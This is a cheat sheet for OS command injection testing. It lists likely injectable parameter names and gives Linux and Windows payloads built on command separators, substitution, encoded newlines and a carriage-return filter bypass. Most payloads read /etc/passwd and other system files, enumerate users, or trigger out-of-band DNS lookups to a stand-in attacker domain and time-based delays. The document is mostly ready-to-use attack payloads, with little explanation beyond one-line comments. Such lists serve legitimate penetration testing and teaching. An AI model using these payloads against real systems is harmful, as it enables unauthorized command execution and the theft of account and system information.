# OS Command Injection 

## Common Parameters
```bash
cmd, print, run, payload, exec, command, execute, ping, query,
jump, code, reg, do, func, arg, option, load, process, step,
read, function, req, feature, exe, module
```

---

## Linux Commands
```bash
; cat /etc/passwd          # User account information
; cat /etc/issue           # Distribution information
; cat /proc/version        # Kernel version information
; lsb_release -a           # Distribution details
; uname -a                 # Kernel and system information
; ls -la /
; id
; pwd
```
### Alternative Commands Instead Of `/etc/passwd`
```bash
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
```

---

## Windows Commands
```cmd
& dir C:\                                           # Lists root directory
& type C:\Windows\System32\drivers\etc\hosts       # Reads hosts file
& net user                                          # Lists users
& ver                                               # Shows Windows version
& systeminfo                                        # Detailed system information
```

---

## Semicolon (;) - Command Sequencing
```bash
command1 ; command2         # Executes commands sequentially
ping -c 2 127.0.0.1 ; id    # Executes 'ping', then 'id'
echo test ; whoami          # Outputs 'test', then username
```

---

## Ampersand (&) - Background Processing
```bash
command1 & command2              # Runs first command in background and continues execution
ping -c 2 127.0.0.1 & dir        # Starts 'ping' and immediately runs 'dir' (Windows)
ping -c 2 127.0.0.1 & ls         # Starts 'ping' and immediately runs 'ls' (Linux)
whoami & hostname                # Runs first command in background, then executes second command
```

---

## Double Ampersand (&&) - Executes Command2 Only If Command1 Succeeds

```bash
command1 && command2
ping -c 2 127.0.0.1 && whoami     # Runs whoami only if ping succeeds
cd /tmp && ls -la                 # Lists directory contents only if cd succeeds
```

---

## Pipe (|) - Pass Output To Another Command
```bash
command1 | command2
whoami | tr a-z A-Z      # Converts username to uppercase
ls -la | grep root       # Lists files and filters for 'root'
```

---

## Double Pipe (||) - Executes Command2 Only If Command1 Fails
```bash
command1 || command2
ping -c 1 invalidhost || whoami      # Runs 'whoami' if ping fails
cat /nonexistentfile || id           # Runs 'id' if file does not exist
cd /fake/path || ls -la              # Lists directory contents if cd fails
```

---

## Arithmetic Expansion ($(()) ) - Evaluates Arithmetic Expressions
```bash
$((expression))        # Evaluates arithmetic expression and returns result
echo $((5+5))          # Outputs result of arithmetic operation
echo $((10*2))         # Outputs multiplication result
echo $((100/4))        # Outputs division result
```

---

## Backtick (`) - Command Substitution
```bash
`command`
echo `whoami`        # Outputs the result of 'whoami'
ping `hostname`      # Pings the result of 'hostname'
```

---

## Dollar ($) - Command Substitution
```bash
$(command)
echo $(whoami)            # Outputs the result of 'whoami'
ping $(hostname)          # Pings the result of 'hostname'
echo $(id)                # Outputs the result of 'id'
cat $(locate passwd)      # Reads files found by 'locate'
printf $(whoami)          # Outputs the result of 'whoami'
```

---

## Nested Substitution

```bash
$(echo `whoami`)        # Outputs the result of 'whoami' (Nested classic in modern)
`echo $(hostname)`      # Outputs the result of 'hostname' (Nested modern in classic)
```

---

## URL Encoded Newlines

```bash
command1 %0a command2      # %0a represents \n
ping%0aid                  # Executes 'ping', then 'id' on new line
whoami%0als                # Runs 'whoami', then 'ls' on new line
```

---

## Carriage Return Injection

```bash
command1 %0d command2              # %0d represents \r
echo test%0dcat /etc/passwd        # Potentially bypasses filters
```

---

## Out-Of-Band Tests
- Tests command injection through external interaction detection.
### DNS Based Detection
```bash
nslookup test.attackerdomain.com          # Generates DNS lookup
||nslookup test.attackerdomain.com||      # Generates DNS lookup
ping test.BURPCOLLAB.com                  # ICMP based detection
dig test.attackerdomain.com               # DNS query tool
```

---

## Time-Based Tests
- Verifies command execution through time delays.
### Linux Delay Commands
```bash
ping -c 10 127.0.0.1                          # 10 second delay using ping
sleep 10                                      # Direct delay command
perl -e "sleep 10"                            # Perl based delay
python -c "import time; time.sleep(10)"       # Python delay
```
### Windows Delay Commands
```powershell
ping -n 10 127.0.0.1 > nul         # Windows ping delay
timeout /t 10                      # Windows timeout command
Start-Sleep -s 10                  # PowerShell sleep
```

---
